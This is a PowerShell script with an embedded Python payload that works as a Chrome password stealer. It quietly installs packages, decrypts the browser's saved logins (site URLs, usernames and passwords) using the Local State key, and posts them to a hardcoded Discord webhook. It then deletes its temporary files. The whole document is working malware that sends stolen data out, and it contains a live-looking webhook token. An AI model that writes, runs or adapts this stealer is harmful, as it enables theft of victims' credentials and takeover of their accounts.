$ErrorActionPreference = 'Stop'
$webhook = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

# Check if Python is installed
try { 
    python --version >$null 2>&1 
} catch { 
    Write-Host "⚠️ Python is not installed. Download it from: https://python.org"
    exit 
}

# Install required Python packages silently
try {
    python -m pip install --upgrade pip >$null 2>&1
    python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
} catch {
    Write-Host "⚠️ Failed to install Python dependencies."
    exit
}

# Python script to extract Chrome passwords
$pythonCode = @'
import os, json, sqlite3, base64, win32crypt
from Crypto.Cipher import AES
import shutil, uuid

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: 
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        except: 
            return ""

def main():
    results = []
    db_copy = None
    conn = None
    cursor = None
    
    try:
        # Chrome paths
        local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        login_db = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'default', 'Login Data')
        
        # Get encryption key
        with open(local_state, 'r', encoding='utf-8') as f:
            encrypted_key = json.load(f)['os_crypt']['encrypted_key']
        key = win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
        
        # Copy database (Chrome locks the original)
        db_copy = f"{uuid.uuid4().hex}.db"
        shutil.copy2(login_db, db_copy)
        
        # Query saved logins
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        
        # Decrypt passwords
        for url, user, pwd in cursor.fetchall():
            if pwd:
                decrypted = decrypt_password(pwd, key)
                if user or decrypted:
                    results.append({
                        'url': url, 
                        'username': user, 
                        'password': decrypted
                    })
        
        print(json.dumps(results))
    except Exception as e:
        print(json.dumps({'error': str(e)}))
    finally:
        if cursor: cursor.close()
        if conn: conn.close()
        if db_copy and os.path.exists(db_copy): os.remove(db_copy)

if __name__ == '__main__':
    main()
'@

# Execute Python script and send results to Discord
$tempFile = "$env:TEMP\chrome_passwords_$(Get-Random).py"
try {
    # Save and run Python script
    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
    $results = python $tempFile 2>&1
    
    # Prepare Discord embed
    $embed = @{
        title = "Chrome Password Extraction Results"
        description = "```json`n$($results)`n```"
        color = if ($results -match 'error') { 16711680 } else { 65280 } # Red if error, else green
    }
    
    $payload = @{
        embeds = @($embed)
        username = "Chrome Password Extractor"
    }
    
    # Send to Discord
    $jsonPayload = $payload | ConvertTo-Json -Depth 3 -Compress
    Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload -ContentType 'application/json' >$null
}
catch {
    Write-Host "⚠️ Error: $_"
}
finally {
    if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
}
